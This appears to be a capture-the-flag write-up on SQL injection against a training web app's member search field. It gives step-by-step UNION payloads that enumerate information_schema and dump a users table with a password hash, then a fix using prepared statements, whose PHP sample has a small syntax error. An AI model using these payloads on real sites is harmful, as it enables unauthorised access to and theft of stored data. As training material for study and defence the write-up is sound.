# SQL Injection - User

We can inject SQL code into the search user id to access database content.

## How-To

1. Go to `/index.php?page=member`
1. Write in the search `input`

	```sql
	-- Sql Injection Detected
	1 OR 1=1
	```

1. Write in the search `input`

	```sql
	-- List Databases and Tables
	1 UNION SELECT 1, CONCAT_WS(CHAR(47), table_schema, table_name) FROM information_schema.tables

	-- Tables:
	--   information_schema
	--     ...
	--   Member_Brute_Force
	--     db_default
	--   Member_Sql_Injection
	--     users
	--   Member_guestbook
	--     guestbook
	--   Member_images
	--     list_images
	--   Member_survey
	--     vote_dbs
	```

1. Write in the search `input`

	```sql
	-- List Tables Columns
	1 UNION SELECT 1, CONCAT_WS(CHAR(47), table_schema, table_name, column_name) FROM information_schema.columns

	-- Tables:
	--   information_schema
	--     ...
	--   Member_Brute_Force
	--     db_default
	--       id
	--       username
	--       password
	--   Member_Sql_Injection
	--     users
	--       user_id
	--       first_name
	--       last_name
	--       town
	--       country
	--       Commentaire
	--       countersign
	--   Member_guestbook
	--     guestbook
	--       id_comment
	--       comment
	--       name
	--   Member_images
	--     list_images
	--       id
	--       url
	--       title
	--       comment
	--   Member_survey
	--     vote_dbs
	--       id_vote
	--       vote
	--       nb_vote
	--       subject
	```

1. Write in the search `input`

	```sql
	-- List Table Content
	1 UNION SELECT 1, CONCAT_WS(CHAR(47), user_id, first_name, last_name, town, country, Commentaire, countersign) FROM Member_Sql_Injection.users

	-- ...
	-- user_id: 5
	-- first_name: Flag
	-- last_name: GetThe
	-- town: 42
	-- country: 42
	-- Commentaire: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
	-- countersign: 5ff9d0165b4f92b14994e5c685cdce28
	```

## Fix

- Do not use root-like user to execute database queries, use one only with specific access rights, we should not be able to access `information_schema`, or any other database than `Member_Sql_Injection`.
- Validate user input, and use prepared SQL query

	```php
	$id = filter_input(INPUT_GET, 'id', FILTER_VALIDATE_INT, [
		'options': [
			'min_range' => 1
		]
	]);

	if ($id)
	{
		$stmt = $db->prepare("SELECT id, first_name, last_name FROM users WHERE id=:id");
		$stmt->bindParam(':id', $id, PDO::PARAM_INT);
		$stmt->execute();
		$user = $stmt->fetch();
		$stmt->closeCursor();

		// Do whatever with $user ...
	}
	```

## Details

- `information_schema` is an ANSI-standard set of read-only views that provide information about all of the tables, views, columns, and procedures in a database.

## Resources

- Owasp : [SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- Wiki : [information_schema](https://en.wikipedia.org/wiki/Information_schema)
- MariaDB : [information_schema.tables](https://mariadb.com/kb/en/information-schema-tables-table/)
- MariaDB : [information_schema.columns](https://mariadb.com/kb/en/information-schema-columns-table/)
- MariaDB : [CONCAT_WS()](https://mariadb.com/kb/en/concat_ws/)
- MariaDB : [CHAR()](https://mariadb.com/kb/en/char/)
- PHP : [PDO](https://www.php.net/manual/fr/book.pdo.php)
- PHP : [filter_input()](https://www.php.net/manual/en/function.filter-input.php)
- Decrypt : [MD5 Decrypt](https://md5decrypt.net/)
- Encrypt : [Sha256 Encrypt](https://md5decrypt.net/en/Sha256/)
